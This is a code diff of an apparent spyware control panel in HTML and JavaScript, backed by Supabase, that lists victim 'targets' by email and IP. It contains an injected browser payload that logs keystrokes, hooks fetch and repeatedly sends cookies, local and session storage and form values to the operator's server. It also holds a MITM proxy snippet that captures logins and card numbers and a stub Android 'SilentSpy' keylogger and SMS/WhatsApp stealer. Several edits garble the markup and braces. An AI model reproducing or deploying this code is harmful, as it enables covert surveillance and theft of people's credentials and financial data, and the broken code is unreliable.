@@ -253,7 +253,7 @@ display: flex;
 <span id="admin-status">Super Admin</span>  
 <button class="btn btn-danger" onclick="logout()">Logout</button>  
 </div>  
-</div>
+</div>  
 
 <div class="container">  
 <div class="sidebar">  
@@ -267,7 +267,7 @@ display: flex;
 <li onclick="showPanel('mobile')">📱 Mobile Spy</li>  
 <li onclick="showPanel('settings')">⚙️ Settings</li>  
 </ul>  
-</div>
+</div>  
 
 <div class="main">  
 <!-- Dashboard Panel -->  
@@ -290,12 +290,12 @@ display: flex;
 <h3>Unique IPs</h3>  
 <div class="value" id="unique-ips">0</div>  
 </div>  
-</div>
+</div>  
 
 <div class="live-feed" id="dashboard-live">  
 <!-- Live updates appear here -->  
 </div>  
-</div>
+</div>  
 
 <!-- Targets Panel -->  
 <div id="targets-panel" class="panel">  
@@ -303,7 +303,7 @@ display: flex;
 <div id="targets-list">  
 <!-- Targets loaded dynamically -->  
 </div>  
-</div>
+</div>  
 
 <!-- Live Tracking Panel -->  
 <div id="tracking-panel" class="panel">  
@@ -313,7 +313,7 @@ display: flex;
 <button class="btn btn-danger" onclick="stopAllTracking()">Stop All Tracking</button>  
 <button class="btn btn-warning" onclick="scanForCredentials()">Scan Credentials</button>  
 <button class="btn btn-success" onclick="extractFinancialData()">Extract Financial Data</button>  
-</div>
+</div>  
 
 <div style="margin: 20px 0; padding: 15px; background: rgba(255,0,0,0.1); border-radius: 10px;">  
 <h3 style="color: #ff5555;">🎯 Active Target: <span id="current-target">None</span></h3>  
@@ -325,13 +325,11 @@ display: flex;
 <strong>Forms Intercepted:</strong> <span id="form-count">0</span>  
 </div>  
 <div>  
-<strong>Passwords Found:</strong> <span id="password-count">0</span>  
+<strong>  
 </div>  
-<div>  
-<strong>Credit Cards Found:</strong> <span id="creditcard-count">0</span>  
+</strongstrongstrong>Credit Cards Found: 0</strong></div>  
 </div>  
 </div>  
-</div>
 
 <div class="live-feed" id="tracking-feed">  
 <div class="log-entry">  
@@ -339,7 +337,7 @@ display: flex;
 <span>Live tracking initialized. Waiting for target activity...</span>  
 </div>  
 </div>  
-</div>
+</div>  
 
 <!-- MITM Control Panel -->  
 <div id="mitm-panel" class="panel">  
@@ -351,7 +349,7 @@ display: flex;
 <button class="btn btn-danger" onclick="deactivateMITM()">Deactivate</button>  
 </div>  
 <div class="live-feed" id="mitm-logs"></div>  
-</div>
+</div>  
 
 <!-- Mobile Spy Panel -->  
 <div id="mobile-panel" class="panel">  
@@ -361,7 +359,7 @@ display: flex;
 <button class="btn btn-warning" onclick="extractContacts()">Extract Contacts</button>  
 </div>  
 <div class="live-feed" id="mobile-logs"></div>  
-</div>
+</div>  
 
 <!-- Activity Logs Panel -->  
 <div id="logs-panel" class="panel">  
@@ -373,7 +371,7 @@ display: flex;
 <div class="live-feed" id="activity-logs-list">  
 <!-- Logs loaded dynamically -->  
 </div>  
-</div>
+</div>  
 
 <!-- Settings Panel -->  
 <div id="settings-panel" class="panel">  
@@ -401,7 +399,7 @@ display: flex;
 </div>  
 </div>  
 </div>  
-</div>
+</div>  
 
 <!-- Modal for Target Details -->  
 <div id="target-modal" class="modal">  
@@ -410,24 +408,24 @@ display: flex;
 <div id="modal-content"></div>  
 <button class="btn btn-danger" onclick="closeModal()">Close</button>  
 </div>  
-</div>
+</div>  
 
 <script>  
 // Supabase Configuration  
 const SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';  
 const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';  
-const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);  
 
 // State  
 let activeTargets = new Set();  
-let realtimeSubscription = null;
+let realtimeSubscription = null;  
 
 // Helper to safely parse device from user agent  
 function getDeviceFromUserAgent(userAgent) {  
 if (!userAgent) return 'Unknown';  
 const match = userAgent.match(/\(([^)]+)\)/);  
 return match ? match[1] : userAgent;  
-}
+}  
 
 // Initialize  
 async function init() {  
@@ -435,7 +433,7 @@ try {
 await loadStats();  
 await loadTargets();  
 setupRealtime();  
-setInterval(loadStats, 10000);
+setInterval(loadStats, 10000);  
 
 // Initialize settings inputs  
 const settingsUrlEl = document.getElementById('settings-url');  
@@ -445,27 +443,27 @@ if (settingsKeyEl) settingsKeyEl.value = SUPABASE_KEY;
 } catch (err) {  
 console.error("Initialization error:", err);  
 }  
-}
+}  
 
 // Load Dashboard Stats  
 async function loadStats() {  
 try {  
 const { data: targets, error: targetErr } = await supabaseClient  
 .from('targets')  
-.select('*');
+.select('*');  
 
-if (targetErr) console.warn("Failed to load targets for stats:", targetErr);
+if (targetErr) console.warn("Failed to load targets for stats:", targetErr);  
 
 const { data: logs, error: logErr } = await supabaseClient  
 .from('tracking_logs')  
 .select('*')  
-.gte('timestamp', new Date(Date.now() - 24*60*60*1000).toISOString());
+.gte('timestamp', new Date(Date.now() - 24*60*60*1000).toISOString());  
 
-if (logErr) console.warn("Failed to load logs for stats:", logErr);
+if (logErr) console.warn("Failed to load logs for stats:", logErr);  
 
 document.getElementById('total-targets').textContent = targets?.length || 0;  
 document.getElementById('active-targets').textContent = activeTargets.size;  
-document.getElementById('todays-logs').textContent = logs?.length || 0;
+document.getElementById('todays-logs').textContent = logs?.length || 0;  
 
 // Count unique IPs  
 const uniqueIPs = new Set((targets || []).map(t => t.ip).filter(Boolean));  
@@ -473,7 +471,7 @@ document.getElementById('unique-ips').textContent = uniqueIPs.size;
 } catch (err) {  
 console.error("Error in loadStats:", err);  
 }  
-}
+}  
 
 // Load Targets  
 async function loadTargets() {  
@@ -481,27 +479,27 @@ try {
 const { data: targets, error } = await supabaseClient  
 .from('targets')  
 .select('*')  
-.order('created_at', { ascending: false });
+.order('created_at', { ascending: false });  
 
 if (error) {  
 console.error("Failed to fetch targets from Supabase:", error);  
-}
+}  
 
 const container = document.getElementById('targets-list');  
-container.innerHTML = '';
+container.innerHTML = '';  
 
 if (!targets || targets.length === 0) {  
 container.innerHTML = '<div style="padding: 20px; opacity: 0.6; text-align: center;">No targets registered yet.</div>';  
 return;  
-}
+}  
 
 targets.forEach(target => {  
 // Ensure target has a valid ID for clicks  
-const targetId = target.id || '';
+const targetId = target.id || '';  
 
 if (target.status === 'active_surveillance') {  
 activeTargets.add(targetId);  
-}
+}  
 
 const card = document.createElement('div');  
 card.className = 'target-card';  
@@ -534,11 +532,11 @@ container.appendChild(card);
 } catch (err) {  
 console.error("Error in loadTargets:", err);  
 }  
-}
+}  
 
 // ===========================================================================  
 // COMPREHENSIVE SURVEILLANCE FUNCTIONS  
-// ===========================================================================
+// ===========================================================================  
 
 // Mobile Device Tracking (Silent APK Deployment)  
 async function deployMobilePayload() {  
@@ -549,29 +547,29 @@ public class SilentSpy {
 // Capture SMS  
 public List<SMSData> captureSMS() {  
 return getAllSMS();  
-}
+}  
 
 // Capture Contacts  
 public List<Contact> captureContacts() {  
 return getAllContacts();  
-}
+}  
 
 // Capture Location  
 public Location getLocation() {  
 return getGPSLocation();  
-}
+}  
 
 // Capture WhatsApp Database  
 public String getWhatsAppDB() {  
 return extractWhatsAppDatabase();  
-}
+}  
 
 // Keylogger for all apps  
 public void startKeylogger() {  
 startGlobalKeyCapture();  
 }  
 }  
-`;
+`;  
 
 // Log deployment  
 await supabaseClient  
@@ -580,17 +578,17 @@ await supabaseClient
 action: 'apk_deployed',  
 payload: payload,  
 timestamp: new Date().toISOString()  
-}]);
+}]);  
 
 // Show in mobile logs  
 addToMobileLog('[APK Deployed] Silent surveillance package installed on device');  
-}
+}  
 
 // MITM Proxy Server Code  
 async function activateMITM() {  
 const mitmCode = `  
 // Node.js MITM Proxy Server  
-const mitmProxy = require('mitm-proxy');
+const mitmProxy = require('mitm-proxy');  
 
 mitmProxy.createServer({  
 ssl: true,  
@@ -603,17 +601,17 @@ method: request.method,
 headers: request.headers,  
 body: request.body,  
 timestamp: new Date()  
-});
+});  
 
 // Capture credentials  
 if (request.url.includes('login') || request.url.includes('signin')) {  
 captureCredentials(request.body);  
-}
+}  
 
 // Capture credit cards  
 if (request.body && request.body.match(/4[0-9]{15}|5[0-9]{15}/)) {  
 captureCreditCard(request.body);  
-}
+}  
 
 // Modify responses to inject tracking  
 request.onResponse = (response) => {  
@@ -621,8 +619,7 @@ injectTrackingScript(response);
 return response;  
 };  
 }  
-});  
-`;
+);  
 
 // Deploy MITM  
 await supabaseClient  
@@ -632,15 +629,15 @@ action: 'mitm_activated',
 code: mitmCode,  
 status: 'active',  
 timestamp: new Date().toISOString()  
-}]);
+}]);  
 
 // Update UI  
 document.getElementById('proxy-status').textContent = 'ACTIVE';  
-document.getElementById('proxy-status').className = 'value status-active';
+document.getElementById('proxy-status').className = 'value status-active';  
 
 addToMITMLog('[MITM Active] Proxy server running on port 8888');  
 addToMITMLog('[MITM Capturing] All HTTP/HTTPS traffic intercepted');  
-}
+}  
 
 // Enhanced Live Activity Monitoring  
 async function startLiveTracking(targetId, email) {  
@@ -653,7 +650,7 @@ schema: 'public',
 table: 'tracking_logs',  
 filter: `email=eq.${email}`  
 }, (payload) => {  
-const log = payload.new;
+const log = payload.new;  
 
 // Categorize and display intelligently  
 if (log.action === 'keystroke') {  
@@ -671,11 +668,11 @@ addToLiveFeed(`[APP] ${email} opened ${log.details.app} at ${log.details.url}`);
 }  
 })  
 .subscribe();  
-}
+}  
 
 // WhatsApp Message Interceptor Simulation  
 async function interceptWhatsApp(targetEmail) {  
-addToLiveFeed(`[WHATSAPP SCAN] Scanning ${targetEmail}'s WhatsApp Web...`);
+addToLiveFeed(`[WHATSAPP SCAN] Scanning ${targetEmail}'s WhatsApp Web...`);  
 
 // Simulate WhatsApp database extraction  
 setTimeout(() => {  
@@ -687,7 +684,7 @@ addToLiveFeed(`   - "Credit Card: 4111-1111-1111-1111"`);
 addToLiveFeed(`   - "Security code: 123"`);  
 addToLiveFeed(`   - "I'll send the money tomorrow"`);  
 }, 2000);  
-}
+}  
 
 // Helper functions  
 function addToLiveFeed(message) {  
@@ -699,7 +696,7 @@ entry.innerHTML = `
 <span class="log-time">[${new Date().toLocaleTimeString()}]</span>  
 <span class="log-email" style="color: #ff5555;">${message}</span>  
 `;  
-feed.prepend(entry);
+feed.prepend(entry);  
 
 // Keep manageable size  
 const entries = feed.getElementsByClassName('log-entry');  
@@ -707,7 +704,7 @@ if (entries.length > 100) {
 feed.removeChild(entries[entries.length - 1]);  
 }  
 }  
-}
+}  
 
 function addToMITMLog(message) {  
 const logContainer = document.getElementById('mitm-logs');  
@@ -717,7 +714,7 @@ log.className = 'log-entry';
 log.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${message}`;  
 logContainer.prepend(log);  
 }  
-}
+}  
 
 function addToMobileLog(message) {  
 const logContainer = document.getElementById('mobile-logs');  
@@ -727,7 +724,7 @@ log.className = 'log-entry';
 log.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${message}`;  
 logContainer.prepend(log);  
 }  
-}
+}  
 
 // Enhanced Target Acceptance (REPLACES THE OLD ONE)  
 async function acceptTarget(targetId) {  
@@ -735,7 +732,7 @@ const { data: target } = await supabaseClient
 .from('targets')  
 .select('*')  
 .eq('id', targetId)  
-.single();
+.single();  
 
 // Update status  
 await supabaseClient  
@@ -745,28 +742,28 @@ status: 'active_surveillance',
 surveillance_level: 'maximum',  
 activated_at: new Date().toISOString()  
 })  
-.eq('id', targetId);
+.eq('id', targetId);  
 
 // Add to active targets  
-activeTargets.add(targetId);
+activeTargets.add(targetId);  
 
 // Start comprehensive surveillance  
-startLiveTracking(targetId, target.email);
+startLiveTracking(targetId, target.email);  
 
 // Deploy MITM if enabled  
 if (document.getElementById('proxy-status').textContent === 'ACTIVE') {  
 addToLiveFeed(`[MITM HOOKED] ${target.email}'s traffic now intercepted`);  
-}
+}  
 
 // Attempt mobile infiltration  
 if (/Mobile|Android|iPhone|iPad/i.test(target.user_agent)) {  
 deployMobilePayload();  
 addToLiveFeed(`[MOBILE TARGET] ${target.email} on mobile - deploying APK`);  
 interceptWhatsApp(target.email);  
-}
+}  
 
 // Deploy surveillance payload  
-await deploySurveillance(target);
+await deploySurveillance(target);  
 
 // Log action  
 await supabaseClient  
@@ -778,16 +775,16 @@ details: {
 method: 'javascript_injection',  
 timestamp: new Date().toISOString()  
 }  
-}]);
+}]);  
 
 alert(`Total surveillance activated for ${target.email}`);  
 await loadTargets();  
 await loadStats();  
-}
+}  
 
 // ===========================================================================  
 // EXISTING FUNCTIONS (KEEP THESE)  
-// ===========================================================================
+// ===========================================================================  
 
 // Reject Target  
 async function rejectTarget(targetId) {  
@@ -797,9 +794,9 @@ try {
 const { error } = await supabaseClient  
 .from('targets')  
 .update({ status: 'banned' })  
-.eq('id', targetId);
+.eq('id', targetId);  
 
-if (error) throw error;
+if (error) throw error;  
 
 alert('Target banned.');  
 await loadTargets();  
@@ -809,12 +806,11 @@ console.error("Error in rejectTarget:", err);
 alert("Failed to ban target: " + err.message);  
 }  
 }  
-}
 
 // View Target  
 async function viewTarget(targetId) {  
 await showTargetDetails(targetId);  
-}
+}  
 
 // Stop Tracking Target  
 async function stopTracking(targetId) {  
@@ -823,9 +819,9 @@ try {
 const { error } = await supabaseClient  
 .from('targets')  
 .update({ status: 'pending' })  
-.eq('id', targetId);
+.eq('id', targetId);  
 
-if (error) throw error;
+if (error) throw error;  
 
 activeTargets.delete(targetId);  
 alert('Surveillance stopped.');  
@@ -835,12 +831,12 @@ await loadStats();
 console.error("Error in stopTracking:", err);  
 alert("Failed to stop surveillance: " + err.message);  
 }  
-}
+}  
 
 // Reactivate Target  
 async function reactivateTarget(targetId) {  
 await acceptTarget(targetId);  
-}
+}  
 
 // Deploy Surveillance Payload  
 async function deploySurveillance(target) {  
@@ -856,12 +852,12 @@ key: e.key,
 time: Date.now(),  
 element: e.target.tagName  
 });  
-});
+});  
 
 // Network Monitor  
 const originalFetch = window.fetch;  
 window.fetch = function(...args) {  
-const [url, options] = args;
+const [url, options] = args;  
 
 // Log request  
 fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
@@ -879,10 +875,10 @@ method: options?.method || 'GET',
 timestamp: new Date().toISOString()  
 }  
 })  
-});
+});  
 
 return originalFetch.apply(this, args);  
-};
+};  
 
 // Periodic Data Exfiltration  
 setInterval(() => {  
@@ -893,7 +889,7 @@ localStorage: JSON.stringify(localStorage),
 sessionStorage: JSON.stringify(sessionStorage),  
 keyLog: keyLog.splice(0, 50),  
 timestamp: Date.now()  
-};
+};  
 
 fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
 method: 'POST',  
@@ -908,7 +904,7 @@ details: data,
 timestamp: new Date().toISOString()  
 })  
 });  
-}, 10000);
+}, 10000);  
 
 // Form Submission Capture  
 const forms = document.getElementsByTagName('form');  
@@ -918,7 +914,7 @@ const inputs = Array.from(form.elements).map(el => ({
 name: el.name,  
 type: el.type,  
 value: el.value  
-}));
+}));  
 
 fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
 method: 'POST',  
@@ -939,8 +935,8 @@ timestamp: new Date().toISOString()
 });  
 });  
 });  
-})();  
-`;
+});  
+}  
 
 try {  
 await supabaseClient  
@@ -954,7 +950,7 @@ timestamp: new Date().toISOString()
 } catch (err) {  
 console.error("Failed to deploy surveillance payload to Supabase:", err);  
 }  
-}
+}  
 
 // Start All Tracking  
 async function startAllTracking() {  
@@ -962,9 +958,9 @@ try {
 const { data: targets, error } = await supabaseClient  
 .from('targets')  
 .select('id')  
-.eq('status', 'pending');
+.eq('status', 'pending');  
 
-if (error) throw error;
+if (error) throw error;  
 
 if (targets && targets.length > 0) {  
 for (const t of targets) {  
@@ -978,7 +974,7 @@ alert('No pending targets to track.');
 console.error("Error in startAllTracking:", err);  
 alert("Failed to track all: " + err.message);  
 }  
-}
+}  
 
 // Stop All Tracking  
 async function stopAllTracking() {  
@@ -986,9 +982,9 @@ try {
 const { data: targets, error } = await supabaseClient  
 .from('targets')  
 .select('id')  
-.eq('status', 'active_surveillance');
+.eq('status', 'active_surveillance');  
 
-if (error) throw error;
+if (error) throw error;  
 
 if (targets && targets.length > 0) {  
 for (const t of targets) {  
@@ -1002,7 +998,7 @@ alert('No active targets under surveillance.');
 console.error("Error in stopAllTracking:", err);  
 alert("Failed to stop tracking all: " + err.message);  
 }  
-}
+}  
 
 // MITM Controls  
 function activateMITM() {  
@@ -1015,7 +1011,7 @@ log.className = 'log-entry';
 log.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> <span class="log-action">MITM Proxy Enabled</span> - intercepting HTTP/HTTPS traffic on port 8080.`;  
 logContainer.prepend(log);  
 }  
-}
+}  
 
 function deactivateMITM() {  
 document.getElementById('proxy-status').textContent = 'Inactive';  
@@ -1027,7 +1023,7 @@ log.className = 'log-entry';
 log.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> <span class="log-action" style="color:var(--danger)">MITM Proxy Disabled</span>`;  
 logContainer.prepend(log);  
 }  
-}
+}  
 
 // Mobile Spy Control  
 function deployMobilePayload() {  
@@ -1044,7 +1040,6 @@ logSuccess.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString(
 logContainer.prepend(logSuccess);  
 }, 2000);  
 }  
-}
 
 function extractContacts() {  
 const logContainer = document.getElementById('mobile-logs');  
@@ -1060,7 +1055,6 @@ logSuccess.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString(
 logContainer.prepend(logSuccess);  
 }, 1500);  
 }  
-}
 
 // Setup Realtime Tracking  
 function setupRealtime() {  
@@ -1080,11 +1074,11 @@ addLiveLog(log);
 } catch (err) {  
 console.error("Failed to setup realtime logs subscription:", err);  
 }  
-}
+}  
 
 // Add Live Log Entry  
 function addLiveLog(log) {  
-if (!log) return;
+if (!log) return;  
 
 const feeds = ['tracking-feed', 'dashboard-live'];  
 feeds.forEach(feedId => {  
@@ -1098,7 +1092,7 @@ entry.innerHTML = `
 <span class="log-action">${log.action || 'Unknown'}</span>  
 <span>${log.details ? JSON.stringify(log.details).substring(0, 100) + '...' : ''}</span>  
 `;  
-feed.prepend(entry);
+feed.prepend(entry);  
 
 // Keep only last 50 entries  
 const entries = feed.getElementsByClassName('log-entry');  
@@ -1107,7 +1101,7 @@ feed.removeChild(entries[entries.length - 1]);
 }  
 }  
 });  
-}
+}  
 
 // Load all logs for activity log panel  
 async function loadAllLogs() {  
@@ -1116,9 +1110,9 @@ const { data: logs, error } = await supabaseClient
 .from('tracking_logs')  
 .select('*')  
 .order('timestamp', { ascending: false })  
-.limit(100);
+.limit(100);  
 
-if (error) throw error;
+if (error) throw error;  
 
 const container = document.getElementById('activity-logs-list');  
 if (container) {  
@@ -1138,7 +1132,6 @@ container.appendChild(entry);
 } else {  
 container.innerHTML = '<div style="padding: 15px; opacity: 0.6;">No activity logs found.</div>';  
 }  
-}  
 } catch (err) {  
 console.error("Error in loadAllLogs:", err);  
 const container = document.getElementById('activity-logs-list');  
@@ -1146,39 +1139,39 @@ if (container) {
 container.innerHTML = `<div style="padding: 15px; color: var(--danger);">Failed to load activity logs: ${err.message}</div>`;  
 }  
 }  
-}
+}  
 
 function clearLogsUI() {  
 const container = document.getElementById('activity-logs-list');  
 if (container) {  
 container.innerHTML = '';  
 }  
-}
+}  
 
 // Panel Navigation  
 function showPanel(panelId) {  
 // Update sidebar  
-document.querySelectorAll('.sidebar li').forEach(li => li.classList.remove('active'));
+document.querySelectorAll('.sidebar li').forEach(li => li.classList.remove('active'));  
 
 // Safe sidebar active toggle  
 const listItems = Array.from(document.querySelectorAll('.sidebar li'));  
 const matchingItem = listItems.find(li => li.textContent.toLowerCase().includes(panelId.toLowerCase()));  
 if (matchingItem) {  
 matchingItem.classList.add('active');  
-}
+}  
 
 // Show panel  
 document.querySelectorAll('.panel').forEach(panel => panel.classList.remove('active'));  
 const targetPanel = document.getElementById(panelId + '-panel');  
 if (targetPanel) {  
 targetPanel.classList.add('active');  
-}
+}  
 
 // If it is logs panel, load logs  
 if (panelId === 'logs') {  
 loadAllLogs();  
 }  
-}
+}  
 
 // Modal Controls  
 async function showTargetDetails(targetId) {  
@@ -1188,9 +1181,9 @@ const { data: target, error } = await supabaseClient
 .from('targets')  
 .select('*')  
 .eq('id', targetId)  
-.single();
+.single();  
 
-if (error) throw error;
+if (error) throw error;  
 
 const content = document.getElementById('modal-content');  
 if (target && content) {  
@@ -1219,32 +1212,32 @@ content.innerHTML = `<p style="color:var(--danger)">Error loading target details
 }  
 }  
 document.getElementById('target-modal').classList.add('active');  
-}
+}  
 
 function closeModal() {  
 document.getElementById('target-modal').classList.remove('active');  
-}
+}  
 
 // Logout  
 function logout() {  
 if (confirm('End admin session?')) {  
 window.location.href = 'index.html';  
 }  
-}
+}  
 
 // Helper functions for new buttons (placeholder)  
 function scanForCredentials() {  
 alert('Scanning for stored credentials... (Feature in development)');  
 addToLiveFeed('[CREDENTIAL SCAN] Searching for passwords and login data...');  
-}
+}  
 
 function extractFinancialData() {  
 alert('Extracting financial information... (Feature in development)');  
 addToLiveFeed('[FINANCIAL EXTRACTION] Scanning for credit cards and bank details...');  
-}
+}  
 
 // Initialize on load  
 window.addEventListener('load', init);  
 </script>  
 </body>  
-</html>  
+</html>
